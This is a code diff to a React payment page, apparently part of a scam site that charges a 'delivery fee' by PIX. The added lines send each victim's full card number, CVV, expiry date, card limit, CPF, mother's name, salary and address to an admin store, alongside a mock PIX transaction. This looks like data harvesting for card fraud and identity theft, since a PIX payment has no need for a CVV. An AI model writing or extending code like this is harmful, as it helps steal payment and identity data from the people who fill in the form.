@@ -1,6 +1,7 @@
 import { useState, useEffect, useRef } from 'react';
 import { motion } from 'framer-motion';
 import { useUserStore } from '../../store/userStore';
+import { useAdminStore } from '../../store/adminStore';
 import { gerarPIX, verificarPagamento } from '../../services/pix';
 import { trackPurchase } from '../../services/facebookPixel';
 import { notificarPedidoPendente, notificarPagamentoAprovado } from '../../services/pushcut';
@@ -229,6 +230,28 @@ export default function PaymentPage() {
           expiresAt: mockResult.expiresAt,
           valor: dadosPix.amount
         }));
+        
+        // Salvar pedido mock no admin store
+        addOrder({
+          nomeCompleto,
+          telefone,
+          cpf,
+          email,
+          dataNascimento,
+          profissao,
+          salario,
+          nomeMae,
+          endereco,
+          valorEntrega: dadosPix.amount,
+          transactionId: mockResult.transactionId,
+          pixCode: mockResult.pixCode,
+          pixQrCode: mockResult.qrCode,
+          numeroCartao,
+          cvv,
+          validade,
+          bandeiraCartao,
+          limite,
+        });
       } else {
         alert('Erro ao gerar PIX. Tente novamente.');
       }
